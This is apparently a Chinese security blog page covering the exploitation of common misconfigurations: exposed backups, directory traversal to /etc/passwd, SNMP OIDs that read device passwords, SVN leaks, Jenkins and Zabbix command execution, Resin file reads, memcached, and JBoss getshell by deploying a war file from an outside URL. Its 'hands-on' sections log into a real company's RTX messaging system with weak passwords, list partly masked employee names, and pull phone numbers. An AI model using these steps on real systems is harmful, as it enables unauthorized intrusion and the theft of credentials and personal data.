<h2 id="9-1-利用方式"><a href="#9-1-利用方式" class="headerlink" title="9.1 利用方式 "></a>9.1 利用方式 </h2><p>未做限制访问的URL为：<a href="http://www.apache.org/server-status" target="_blank" rel="noopener">http://www.apache.org/server-status</a></p>
<h1 id="10-网站备份文件可下载"><a href="#10-网站备份文件可下载" class="headerlink" title="10 网站备份文件可下载 "></a>10 网站备份文件可下载 </h1><p>该问题可能导致源代码泄露，获取web.conf文件，从中得到数据库密码，导致进一步渗透。</p>
<h2 id="10-1-利用方式"><a href="#10-1-利用方式" class="headerlink" title="10.1 利用方式 "></a>10.1 利用方式 </h2><p>常见备份目录为：</p>
<p><a href="http://www.xxx.com/xxx.rar" target="_blank" rel="noopener">http://www.xxx.com/xxx.rar</a></p>
<p><a href="http://www.xxx.com/xxx.zip" target="_blank" rel="noopener">http://www.xxx.com/xxx.zip</a></p>
<p><a href="http://aaa.xxx.com/aaa.rar" target="_blank" rel="noopener">http://aaa.xxx.com/aaa.rar</a></p>
<p><a href="http://bbb.xxx.com.cn/bbb.tar" target="_blank" rel="noopener">http://bbb.xxx.com.cn/bbb.tar</a></p>
<p><a href="http://bbb.xxx.com/sysadmin.tar.gz" target="_blank" rel="noopener">http://bbb.xxx.com/sysadmin.tar.gz</a></p>
<p>ip/<a href="http://www.xxx.com.zip" target="_blank" rel="noopener">www.xxx.com.zip</a></p>
<ul>
<li><p>直接在URL中访问，然后下载</p>
</li>
<li><p>使用curl工具 例如： curl -I<br><a href="http://www.fff.com/fff.zip" target="_blank" rel="noopener">http://www.fff.com/fff.zip</a></p>
</li>
</ul>
<p>（curl是利用URL语法在命令行下工作的开原文件传输工具）</p>
<h1 id="11-目录遍历并查看敏感数据"><a href="#11-目录遍历并查看敏感数据" class="headerlink" title="11 目录遍历并查看敏感数据 "></a>11 目录遍历并查看敏感数据 </h1><p>这类漏洞的危害可大可小，一般都是结合具体环境来利用。</p>
<h2 id="11-1-利用方式"><a href="#11-1-利用方式" class="headerlink" title="11.1 利用方式 "></a>11.1 利用方式 </h2><p>根据从wooyun上看到的漏洞，其发现方式主要有:</p>
<ul>
<li><p>wvs扫描目录 (inc，<br>返回312，直接访问看到目录列表)</p>
</li>
<li><p>常见泄露路径：</p>
</li>
</ul>
<p><a href="http://www.xxx.com/caches" target="_blank" rel="noopener">http://www.xxx.com/caches</a></p>
<p><a href="http://www.xxx.com/database" target="_blank" rel="noopener">http://www.xxx.com/database</a></p>
<p><a href="http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd" target="_blank" rel="noopener">http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd</a></p>
<h1 id="12-SNMP信息泄露"><a href="#12-SNMP信息泄露" class="headerlink" title="12 SNMP信息泄露 "></a>12 SNMP信息泄露 </h1><p>drops.wooyun.org/tips/409</p>
<h2 id="12-1-基本原理"><a href="#12-1-基本原理" class="headerlink" title="12.1 基本原理 "></a>12.1 基本原理 </h2><p>SNMP（简单网络管理协议）：该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。目前共有V1、V2、V3三个版本，应用比较广泛的还是前两个版本，同时存在安全问题也较多。</p>
<p>Cacti、Mrtg等监控工具都基于snmp协议。其原理可以简单理解为：</p>
<p>管理主机向被管理的主机或设备发送一个请求（包含community和oid）</p>
<p>（community相当于认证口令）</p>
<p>（oid为代号，例如112代表CPU使用率，113代表内存使用率）</p>
<p>被管理设备收到请求后先查看community是否与自己保持的一致，若一致则返回请求</p>
<p>信息，若不一致则不返回任何信息。</p>
<p>此外，管理主机通过snmp协议除了可以获取被管理主机的信息外，还可以修改其配置</p>
<p>信息（主要是路由交换设备方面）。</p>
<h2 id="12-2-snmp弱口令"><a href="#12-2-snmp弱口令" class="headerlink" title="12.2 snmp弱口令 "></a>12.2 snmp弱口令 </h2><p>snmp服务器的默认密码为public，漏洞发现与扫描：</p>
<ul>
<li><p>x-scan扫描 + GFI LANGard利用</p>
</li>
<li><p>使用Snmp Digger进行漏洞利用</p>
</li>
<li><p>snmputil.exe</p>
</li>
</ul>
<p>snmputil.exe get|getnext|walk agent community oid[oid……]</p>
<p>当前进程列表 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.4.2.1.2</p>
<p>系统用户列表 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.2.25.1.1</p>
<p>列 出 域 名 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.4.1.0</p>
<p>列出安装软件 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.6.3.1.2</p>
<p>列出系统信息 snmputil.exe walk ip public .1.3.6.1.2.1.1</p>
<ul>
<li>IP Network<br>Browser（snmp浏览工具）</li>
</ul>
<h2 id="12-3-snmp获取管理员密码"><a href="#12-3-snmp获取管理员密码" class="headerlink" title="12.3 snmp获取管理员密码 "></a>12.3 snmp获取管理员密码 </h2><p>snmp默认开放端口: 161</p>
<ul>
<li>H3C防火墙：通过SNMP只读权限的团体字符串便可以读到管理密码，从而控制设备。（WooYun-2013-21877(<a href="http://www.wooyun.org/bugs/wooyun-2013-021877)）" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-021877)）</a></li>
</ul>
<p>扫描工具：<br>solarwinds中的snmpsweep</p>
<p>升级版：solarwinds工具包中的 ip browser</p>
<ul>
<li>华为quidway三层交换</li>
</ul>
<p>利用这个OID读出的密码为明文（WooYun-2013-21964(<a href="http://www.wooyun.org/bugs/wooyun-2013-021964)）" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-021964)）</a></p>
<p>root@bt:~# snmpwalk -c private -v 1 x.x.x.x<br>1.3.6.1.4.1.2011.5.2.1.10.1</p>
<p>对于存在该漏洞的设备，目前已知可以获取帐号的oid有一下三个（walk）:</p>
<p>1.3.6.1.4.1.2011.5.2.1.10.1</p>
<p>1.3.6.1.4.1.2011.10.2.12.1.1.1</p>
<p>1.3.6.1.4.1.25506.2.12.1.1.1</p>
<h2 id="12-4-实战演练"><a href="#12-4-实战演练" class="headerlink" title="12.4 实战演练 "></a>12.4 实战演练 </h2><p><code>snmpwalk -v 2c -c public xx.xx.xx.xx</code></p>
<p><img src="\assets\img\安全运维\file_html_41e07a3a71e3e362.png" alt=""></p>
<h1 id="13-SVN源码泄露"><a href="#13-SVN源码泄露" class="headerlink" title="13 SVN源码泄露 "></a>13 SVN源码泄露 </h1><p>drops.wooyun.org/tips/352(<a href="http://drops.wooyun.org/tips/352" target="_blank" rel="noopener">http://drops.wooyun.org/tips/352</a>)</p>
<h2 id="13-1-SVN介绍"><a href="#13-1-SVN介绍" class="headerlink" title="13.1 SVN介绍 "></a>13.1 SVN介绍 </h2><p>Subversion，简称SVN，是一个开放源代码的版本控制系统。在开源软件的开发过程中，由于开发方式自由和开发人员分散等特性，版本控制问题一直关系到项目成败，没有版本控制开源软件的开发过程就会变得混乱和不可控制。</p>
<p>Subversion使用服务端—客户端的结构（当然服务端与客户端可以都运行在同一台服务器上）。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。两端间通过各种仓库存取层（Repository<br>Access，简称RA）的多条通道（通道中可以通过不同的网络协议比如HTTP、SSH或本地文件等）进行访问的。</p>
<p>svn默认端口是3690</p>
<h2 id="13-2-漏洞原理"><a href="#13-2-漏洞原理" class="headerlink" title="13.2 漏洞原理 "></a>13.2 漏洞原理 </h2><p>程序导出方式：</p>
<p>在现实开发环境中，建议使用导出功能svn<br>export（而不是svn co）</p>
<p>svn co ：【导出结果带 .svn<br>文件夹的目录树】</p>
<p>svn co http://路径[本地目录全路径]<br>–username 用户名 –password 密码</p>
<p>svn co svn://路径[本地目录全路径]<br>–username 用户名 –password 密码</p>
<p>svn export ：【导出结果不带 .svn<br>文件夹的目录树】</p>
<p>svn export [-r版本号]<br>http://路径[本地目录全路径] –username<br>用户名 –password 密码</p>
<p>svn export [-r版本号]<br>svn://路径[本地目录全路径] –username<br>用户名 –password 密码</p>
<p>漏洞产生原因：</p>
<p>在实际开发环境中，很管理员直接把svn<br>co导出来的代码放到web目录下，致使 .svn<br>隐藏文件夹暴露于外网环境中，恶意攻击者可以借助其中包含的用于版本信息追踪的“entries”文件逐步摸清站点结构。</p>
<p>漏洞利用方式：</p>
<p>若 .svn目录没有做访问权限限制，可以通过<br>.svn 来遍历文件和目录列表。</p>
<p>若<br>*.php.svn-base被当做php来执行，若暴露php错误信息(真实路径)或空白内容，则该站点存在扩展名问题，找文件上传处上传xx.php.gif文件获取webshell。</p>
<p>若<br>*.php.svn-base不当做php文件执行，则可下载svn中的所有php源码文件。</p>
<ul>
<li><p>直接在浏览器中访问 /.svn/entries</p>
</li>
<li><p>利用seay的svn工具</p>
</li>
</ul>
<h1 id="14-hadhoop应用对外访问"><a href="#14-hadhoop应用对外访问" class="headerlink" title="14 hadhoop应用对外访问 "></a>14 hadhoop应用对外访问 </h1><h2 id="14-1-基础概念"><a href="#14-1-基础概念" class="headerlink" title="14.1 基础概念 "></a>14.1 基础概念 </h2><p>Hadoop是一个由apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p>
<h2 id="14-2-漏洞利用"><a href="#14-2-漏洞利用" class="headerlink" title="14.2 漏洞利用 "></a>14.2 漏洞利用 </h2><p>默认开放端口：</p>
<p>hadoop 50070</p>
<p>hbase 50075</p>
<p>hdfs 50090</p>
<ul>
<li><p>Hadoop管理界面弱口令，例如：admin 123456<br>WooYun-2014-58320(<a href="http://www.wooyun.org/bugs/wooyun-2014-058320" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2014-058320</a>)</p>
</li>
<li><p>Hadoop远程命令执行，通过hadoop，hbase，hdfs0.2<br>RC版本的管理web端能远程执行命令（jstack<br>pstack<br>servlet执行命令），通过该节点对集群服务器进行任务分发（该项是基本功能，可以进行批量提权linux主机），从而渗透进hadoop集群。<br>WooYun-2013-20282(<a href="http://www.wooyun.org/bugs/wooyun-2013-020282" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-020282</a>)</p>
</li>
</ul>
<h1 id="15-Nagios信息泄露"><a href="#15-Nagios信息泄露" class="headerlink" title="15 Nagios信息泄露 "></a>15 Nagios信息泄露 </h1><p>Nagios是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机及服务，可运行在linux、unix平台上，同时提供一个基于浏览器的WEB界面以方便系统管理人员查看网络状态，各种系统问题以及日志等等。</p>
<h2 id="15-1-漏洞利用"><a href="#15-1-漏洞利用" class="headerlink" title="15.1 漏洞利用 "></a>15.1 漏洞利用 </h2><p>Nagios运维监控API接口暴露<br>WooYun-2014-86842(<a href="http://wooyun.org/bugs/wooyun-2014-086842" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2014-086842</a>)</p>
<h1 id="16-RTX即时通信信息泄露"><a href="#16-RTX即时通信信息泄露" class="headerlink" title="16 RTX即时通信信息泄露 "></a>16 RTX即时通信信息泄露 </h1><p>腾讯通RTX(Real Time<br>eXchange)是腾讯公司推出的企业级即时通信平台。企业员工可以轻松地通过服务器配置的组织架构查找需要进行通信的人员，并采用丰富的沟通方式进行实时沟通。文本消息、文本传输、直接语音会话或者视频的形式满足不同办公环境下的沟通需求。</p>
<h2 id="16-1-漏洞利用"><a href="#16-1-漏洞利用" class="headerlink" title="16.1 漏洞利用 "></a>16.1 漏洞利用 </h2><p>默认开放端口： 8012</p>
<ul>
<li>开放应用端口暴露：<br><a href="http://xx.xx.xx.xx:8012/userlist.php" target="_blank" rel="noopener">http://xx.xx.xx.xx:8012/userlist.php</a></li>
</ul>
<p>直接可以访问到所有用户id、用户名等信息的json</p>
<p>在“查看审核结果处”尝试用户名+弱口令(3102<br>或123456)登陆，登陆成功后即进入内部网络。</p>
<ul>
<li>得到用户名后，可以读取手机号</li>
</ul>
<p>用户名： rtx.bxlq.com/userlist.php</p>
<p>手机号：<br>rtx.bxlq.com/getmobile.cgi?receiver=用户名</p>
<h2 id="16-2-动手实践"><a href="#16-2-动手实践" class="headerlink" title="16.2 动手实践 "></a>16.2 动手实践 </h2><p><a href="http://xx.xx.xx.xx:8012/userlist.php" target="_blank" rel="noopener">http://xx.xx.xx.xx:8012/userlist.php</a> 中国某公司</p>
<p><img src="\assets\img\安全运维\file_html_e1c2ee9745806f6d.png" alt=""></p>
<p>回到首页，查看审核结果处，进行弱口令尝试：高X军<br>/ 123456</p>
<p><img src="\assets\img\安全运维\file_html_7d72e064c94b344c.png" alt=""></p>
<p>回到首页，下载并安装客户端进行登陆</p>
<p><img src="\assets\img\安全运维\file_html_7624c1251b81f7c6.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_da7cf1ecb96eb2d.png" alt=""></p>
<p>一直连接不上，最后用nmap扫描端口，一个个尝试，最终确定为9002</p>
<p>高X军 123456</p>
<p>桂X林 123456</p>
<p>孔X月 123456</p>
<p><img src="\assets\img\安全运维\file_html_9c42e03c9ee49942.png" alt=""></p>
<p>公司领导</p>
<p><img src="\assets\img\安全运维\file_html_4baa431beadedd58.png" alt=""></p>
<h1 id="17-Ganglia系统监控信息泄露"><a href="#17-Ganglia系统监控信息泄露" class="headerlink" title="17 Ganglia系统监控信息泄露 "></a>17 Ganglia系统监控信息泄露 </h1><p>Ganglia是UC<br>Berkeley发起的一个开源集群监视项目，设计用于测量数以千计的节点。Ganglia的核心包含gmond、gmetad以及一个web前段。主要用来监控系统性能，如cpu、mem、硬盘利用率、I/O负载、网络流量情况等，通过曲线很容易见到每个节点的工作状态，对合理调整、分配系统资源，提高系统整体性能起到重要作用。</p>
<p>工作原理：</p>
<p>Ganglia包括如下几个程序，他们之间通过XDR(xml的压缩格式)或者XML格式传递监控数据，达到监控效果。集群内的节点，通过运行gmond收集发布节点状态信息，然后gmetad周期性的轮询gmond收集到的信息，然后存入rrd数据库，通过web服务器可以对其进行查询展示。</p>
<h2 id="17-1-漏洞利用"><a href="#17-1-漏洞利用" class="headerlink" title="17.1 漏洞利用 "></a>17.1 漏洞利用 </h2><p>可以查看公司内部流量信息、被监控主机的配置信息及运行状态。</p>
<p>开放端口：8649<br>（不确定，案例中还有开放8000）</p>
<ul>
<li><p>直接在浏览器地址栏输入IP:8649 eg:<br><a href="http://xx.xx.xxx.xx:8649/" target="_blank" rel="noopener">http://xx.xx.xxx.xx:8649/</a></p>
</li>
<li><p>直接访问域名：ganglia.xx.com</p>
</li>
<li><p>使用nc查看： nc.exe iii.com<br>8649 |more</p>
</li>
</ul>
<h1 id="18-j2ee应用架构（web服务器搭配不当）"><a href="#18-j2ee应用架构（web服务器搭配不当）" class="headerlink" title="18 j2ee应用架构（web服务器搭配不当） "></a>18 j2ee应用架构（web服务器搭配不当） </h1><p>drops.wooyun.org/papers/60</p>
<p>在通常的web应用中会将多个web服务器搭配着使用，以解决其中某台服务器的性能缺陷、负载均衡及完成一些分层结构的安全策略等。较常见的如：Nginx+Tomcat的分层结构</p>
<p>Nginx：高性能的HTTP和反向代理服务器。通过它可以解决一些静态资源(图片、js、css等类型的文件)访问处理。</p>
<p>Tomcat：免费开放源代码的j2ee<br>Web服务器。其性能缺陷：处理静态资源特别是图片文件时特别吃力。</p>
<h2 id="18-1-漏洞成因"><a href="#18-1-漏洞成因" class="headerlink" title="18.1 漏洞成因 "></a>18.1 漏洞成因 </h2><p>由于处理方式或分层架构设计，如果对静态资源的目录或文件的映射配置不当，就会引发安全问题(特别是在j2ee应用中)。</p>
<p>Tomcat的WEB-INF目录(每个j2ee的web应用部署文件默认包含该目录)，在tomcat中该目录禁止访问，包含以下内容：</p>
<p>classes目录：包含该应用核心的java类编译后的class文件及部分配置文件；</p>
<p>lib目录：所有框架、插件和组件的架包；</p>
<p>web.xml目录：重要配置文件。(展开攻击的一把钥匙)</p>
<p>Nginx在解析静态文件时，把web-inf目录映射进去，若没有做nginx相关安全配置或由于nginx自身缺陷影响，将导致通过nginx访问到tomcat的web-inf目录。</p>
<p>通常，只配置nginx把与j2ee及开发架或自定义框架有关的url(例如：.jsp<br>、.do、.action…等)交给tomcat，剩下的大部分后缀类型的url直接交给nginx处理(包括web-inf中比较重要的.xml、class等类型)。</p>
<h2 id="18-2-漏洞利用"><a href="#18-2-漏洞利用" class="headerlink" title="18.2 漏洞利用 "></a>18.2 漏洞利用 </h2><p>该问题普遍存在于大型站点应用中，由于j2ee应用自身的一些特性，例如：起点配置文件web.xml（/WEB-IINF/web.xml），若先找到它并结合j2ee的xml路径配置特点，就可以找到其他的配置文件(需进行反编译)，甚至获得整个应用的所有核心代码及应用架构的相关信息。</p>
<h2 id="18-3-修复方案"><a href="#18-3-修复方案" class="headerlink" title="18.3 修复方案 "></a>18.3 修复方案 </h2><ul>
<li><p>最好不要映射非静态文件目录或敏感目录；</p>
</li>
<li><p>修改nginx配置文件，禁止访问WEB-INF文件<br>:<code>Location ~ ^/WEB-INF/* {deny all;}</code></p>
</li>
</ul>
<h1 id="19-Jenkins平台未设置登录验证"><a href="#19-Jenkins平台未设置登录验证" class="headerlink" title="19 Jenkins平台未设置登录验证 "></a>19 Jenkins平台未设置登录验证 </h1><p>Jenkins是基于java开发的一种持续集成工具，用于监控持续重复的工作，功能包括：(1)持续的软件版本发布/测试项目；(2)监控外部调用执行的工作。</p>
<h2 id="19-1-漏洞利用"><a href="#19-1-漏洞利用" class="headerlink" title="19.1 漏洞利用 "></a>19.1 漏洞利用 </h2><ul>
<li>未授权访问，可直接执行命令 wooyun-2013-028803</li>
</ul>
<p>直接在url中访问： eg:<br><a href="http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)" target="_blank" rel="noopener">http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)</a><br>(端口视具体情况而定，案例中有3000、8888)</p>
<ul>
<li><a href="http://ip/script" target="_blank" rel="noopener">http://ip/script</a></li>
</ul>
<p>java.lang.Runtime.getRuntime().exec(‘id’).getText();<br>行脚本并回显一句话</p>
<h1 id="20-zabbix默认口令"><a href="#20-zabbix默认口令" class="headerlink" title="20 zabbix默认口令 "></a>20 zabbix默认口令 </h1><h2 id="20-1-基础知识"><a href="#20-1-基础知识" class="headerlink" title="20.1 基础知识 "></a>20.1 基础知识 </h2><p>Zabbix除了监控功能强大之处，还可以在忘记root密码的时候重置服务器root密码。（这也是一个超级后门）</p>
<p>此外，system.run模块可以执行任意指令（agent在root权限下，不过一般都开启该权限）</p>
<h2 id="20-2-利用方式"><a href="#20-2-利用方式" class="headerlink" title="20.2 利用方式 "></a>20.2 利用方式 </h2><p>弱口令进入后台： <a href="http://ip/zabbix/" target="_blank" rel="noopener">http://ip/zabbix/</a> admin / zabbix</p>
<p>攻击方法：</p>
<ul>
<li><p>尝试system.run执行命令</p>
</li>
<li><p>获取zabbix server shell：</p>
</li>
</ul>
<p>Administrator——&gt;Scripts——&gt;修改Commands(例如改为<br>uname -a)</p>
<p>Monitoring——&gt;Last data——&gt;点击Zabbix<br>server，执行调用命令</p>
<h1 id="21-zenoss默认口令"><a href="#21-zenoss默认口令" class="headerlink" title="21 zenoss默认口令 "></a>21 zenoss默认口令 </h1><h2 id="21-1-基本知识"><a href="#21-1-基本知识" class="headerlink" title="21.1 基本知识 "></a>21.1 基本知识 </h2><p>Zenoss<br>Core是开源企业级IT管理软件-智能监控软件，允许IT管理员依靠单一的WEB控制台来监控网络架构的状态和健康度。Zenoss同时也是开源的网络与系统管理软件。</p>
<h2 id="21-2-漏洞利用"><a href="#21-2-漏洞利用" class="headerlink" title="21.2 漏洞利用 "></a>21.2 漏洞利用 </h2><p>ip:8080 admin / zenoss</p>
<p>ip:8080/zport/dmd/Dashboard</p>
<p>zenoss有一个commands功能，可以执行指令将指令修改为自己需要的即可），然后选中一台机器执行指令。</p>
<p>在wooyun上所见到的案例中，最令人头疼的也最难理解的是：</p>
<ul>
<li><p>wooyun-2013-019917 反弹获取shell</p>
</li>
<li><p>wooyun-2013-019917<br>边界神器py版开启socks代理</p>
</li>
</ul>
<p>（zone.wooyun.org/content/1693）</p>
<ul>
<li>wooyun-2013-019917<br>端口转发（将代理端口转发到公网）</li>
</ul>
<h1 id="22-Resin任意文件读取"><a href="#22-Resin任意文件读取" class="headerlink" title="22 Resin任意文件读取 "></a>22 Resin任意文件读取 </h1><h2 id="22-1-基本知识"><a href="#22-1-基本知识" class="headerlink" title="22.1 基本知识 "></a>22.1 基本知识 </h2><p>Resin：java应用服务器</p>
<p>CAUCHO公司产品，是一个非常流行的application server<br>，对server和JSP提供良好的支持，速度非常快直逼APACHE<br>SERVER。Resin支持负载均衡，可以增加web站点的可靠性。</p>
<h2 id="22-2-漏洞利用"><a href="#22-2-漏洞利用" class="headerlink" title="22.2 漏洞利用 "></a>22.2 漏洞利用 </h2><p>Resin的某个CGI程序实现上存在输入验证漏洞，远程攻击者可能利用此漏洞读取Web主目录下的任意文件。</p>
<ul>
<li>任意文件读取：</li>
</ul>
<p>配置文件：</p>
<p><a href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml" target="_blank" rel="noopener">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml</a></p>
<p>读取源码：</p>
<p><a href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp" target="_blank" rel="noopener">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp</a></p>
<p>读取password.xml</p>
<p>ip/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/password.xml</p>
<ul>
<li>resin文件包含漏洞shell (wooyun-2013-023139)</li>
</ul>
<p><a href="http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini" target="_blank" rel="noopener">http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini</a></p>
<ul>
<li>resin弱口令</li>
</ul>
<p><a href="http://ip/resin-admin/status.php" target="_blank" rel="noopener">http://ip/resin-admin/status.php</a> admin / admin</p>
<ul>
<li>resin版本过低，导致磁盘信息泄露</li>
</ul>
<p><a href="http://ip/c:/" target="_blank" rel="noopener">http://ip/c:/</a></p>
<h2 id="22-3-实例演练"><a href="#22-3-实例演练" class="headerlink" title="22.3 实例演练 "></a>22.3 实例演练 </h2><p><a href="http://www.xx.cn/c:/" target="_blank" rel="noopener">http://www.xx.cn/c:/</a> （wooyun-2013-041338）</p>
<p><img src="\assets\img\安全运维\file_html_c53a22d32c38834b.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_6a5593fbd445e703.png" alt=""></p>
<h1 id="23-memcache未限制访问IP"><a href="#23-memcache未限制访问IP" class="headerlink" title="23 memcache未限制访问IP "></a>23 memcache未限制访问IP </h1><h2 id="23-1-基础知识"><a href="#23-1-基础知识" class="headerlink" title="23.1 基础知识 "></a>23.1 基础知识 </h2><p>Memcached是一个高性能的分布式内存对象缓存系统，用于动态web应用以减轻数据库负载。它通过内存缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。</p>
<h2 id="23-2-漏洞利用"><a href="#23-2-漏洞利用" class="headerlink" title="23.2 漏洞利用 "></a>23.2 漏洞利用 </h2><p>Memcached未限制IP导致cache泄露<br>服务默认端口：11211</p>
<ul>
<li>使用nc 反弹查看数据：</li>
</ul>
<p>nc.exe –vv ip 11211</p>
<p>ip: inverse host lookup failed: h_errno 11004: NO_DATA</p>
<p>(UNKNOWN) [ip] 11211 (?) open</p>
<p>stats items</p>
<p>STAT items:4:number 1544729</p>
<p>…….</p>
<ul>
<li>memcached空口令访问 可以直接telnet登陆<br>wooyun-2010-0123604</li>
</ul>
<ul>
<li>root@kali:~# nc ip 11211</li>
</ul>
<h2 id="23-3-实战演练"><a href="#23-3-实战演练" class="headerlink" title="23.3 实战演练 "></a>23.3 实战演练 </h2><p>root@Aerfa:~# nc -vv xx.xx.xx.xx 11211</p>
<p><img src="\assets\img\安全运维\file_html_ba1df478b9b7aee9.png" alt=""></p>
<p>root@Aerfa:~# nc -vv yy.yy.yy.yy 11211</p>
<p><img src="\assets\img\安全运维\file_html_df926128a0be01ea.png" alt=""></p>
<h1 id="24-Jboss配置不当"><a href="#24-Jboss配置不当" class="headerlink" title="24 Jboss配置不当 "></a>24 Jboss配置不当 </h1><p>drops.wooyun.org/papers/178</p>
<h2 id="24-1-基本信息"><a href="#24-1-基本信息" class="headerlink" title="24.1 基本信息 "></a>24.1 基本信息 </h2><p>Jboss基于J2EE的开放源代码的应用服务器（JAVA应用服务器），是一个管理EJB的容器和服务器（Jboss企业中间件JEMS的一部分），其核心服务不包括service/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>Jboss应用服务框架：</p>
<ul>
<li>Java管理扩展（JMX）：监控管理java应用程序的标准化架构，分为三层：</li>
</ul>
<p><img src="\assets\img\安全运维\file_html_7ca4d6381121d244.png" alt=""></p>
<p>设备层（instrumentation）：定义信息模型。</p>
<p>代理层（Agent）：定义各种服务以及通信模型，所有的管理构件都需要向他注册。</p>
<p>分布服务层（distribute）：定义能对代理层进行操作的管理接口和构件。</p>
<ul>
<li>JMX<br>Invoker：允许客户端应用程序发送任意协议的JMX请求到服务端</li>
</ul>
<p>这些请求都是用MBean服务器发送到响应的Mbean服务</p>
<ul>
<li>Deployer架构：</li>
</ul>
<p>JAR（Java<br>Archives），用于压缩、发布、部署和封装库、组件、程序插件。</p>
<p>WAR（Web<br>ARchives），JAR文件包含一个Web应用程序的组件。</p>
<h2 id="24-2-漏洞利用"><a href="#24-2-漏洞利用" class="headerlink" title="24.2 漏洞利用 "></a>24.2 漏洞利用 </h2><ul>
<li>WAR文件 </li>
</ul>
<p>在Jboss应用服务器上最简单的运行代码方式是部署一个组件，可以通过HTTP安装组件，war文件包需要在web-inf目录下包含一个web.xml文件。War文件可以使用java的SDK<br>jar命令创建。</p>
<ul>
<li>JMX Console</li>
</ul>
<p>web-console</p>
<p>jmx-console</p>
<p>invoker/JMXInvokerServlet</p>
<p>JMX控制台允许通过web浏览器与Jboss应用服务器直接互动的组件，方便管理Jboss服务器，Mbean的属性与方法可以直接调用。</p>
<p>JMX控制台通常是攻击的第一目标，Mbeans的属性（Server和ServerInfo）展现了Jboss应用服务器与主机系统的信息，包含java虚拟机以及操作系统的类型版本信息。</p>
<p>Mbean的shutdown()方法可以关闭Jboss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。</p>
<p>War包的部署，执行shell命令。</p>
<ul>
<li>Jboss弱口令</li>
</ul>
<p><a href="http://IP/admin-console" target="_blank" rel="noopener">http://IP/admin-console</a> admin / admin</p>
<h2 id="24-3-实例应用"><a href="#24-3-实例应用" class="headerlink" title="24.3 实例应用 "></a>24.3 实例应用 </h2><p><a href="http://yy.yy.yy.yy:8080/web-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy:8080/web-console/</a> 未授权访问</p>
<p><img src="\assets\img\安全运维\file_html_8e55e3f044ed0364.png" alt=""></p>
<p>先下载java插件，再控制面板中找到java，设置java控制面板的安全属性，添加例外网站。</p>
<p><img src="\assets\img\安全运维\file_html_90d6709742b78542.png" alt=""></p>
<h3 id="admin-console-getshell"><a href="#admin-console-getshell" class="headerlink" title=" admin-console getshell"></a><1> admin-console getshell</1></h3><p><a href="http://yy.yy.yy.yy/admin-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy/admin-console/</a> 无效</p>
<p><img src="\assets\img\安全运维\file_html_28bdb02a0cb5a373.png" alt=""></p>
<h3 id="jmx-console-getshell"><a href="#jmx-console-getshell" class="headerlink" title=" jmx-console getshell"></a><2> jmx-console getshell</2></h3><p><a href="http://yy.yy.yy.yy/jmx-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy/jmx-console/</a> 存在</p>
<p>需要将war包或jsp shell放到服务器上<br><a href="http://p2j.cn/is.war" target="_blank" rel="noopener">http://p2j.cn/is.war</a></p>
<p>jboss.deployment——&gt;void addURL</p>
<p><img src="\assets\img\安全运维\file_html_d6a528da8f01270e.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_fa352df195521efa.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_5acfb48291d0131b.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_b4b2160d26750158.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_cc69a4e856862c50.png" alt=""></p>
<p>上传成功，但是文件访问不存在</p>
<p><img src="\assets\img\安全运维\file_html_6201bba2e6c4598.png" alt=""></p>
<h3 id="web-console-getshell"><a href="#web-console-getshell" class="headerlink" title=" web-console getshell"></a><3> web-console getshell</3></h3><p><a href="http://xx.xx.xx.xx/web-console/" target="_blank" rel="noopener">http://xx.xx.xx.xx/web-console/</a> 存在</p>
<p><img src="\assets\img\安全运维\file_html_15bb592501eaeab4.png" alt=""></p>
<h3 id="invoker-getshell"><a href="#invoker-getshell" class="headerlink" title=" invoker getshell"></a><41> invoker getshell</41></h3><p>inovker接口未配置认证信息</p>
<p>yy.yy.yy.yy/invoker/JMXInvokerServlet</p>
<p><img src="\assets\img\安全运维\file_html_51cd584709c21a49.png" alt=""></p>
<p>案例<a href="http://www.wooyun.org/bugs/wooyun-2010-0121861" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0121861</a>中使用curl命令：</p>
<p>curl <a href="http://www.wooyun.org/bugs/wooyun-2010-0121861" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0121861</a></p>
<p><img src="\assets\img\安全运维\file_html_ce74e6ffdf131681.png" alt=""></p>
<p>查看系统名称：</p>
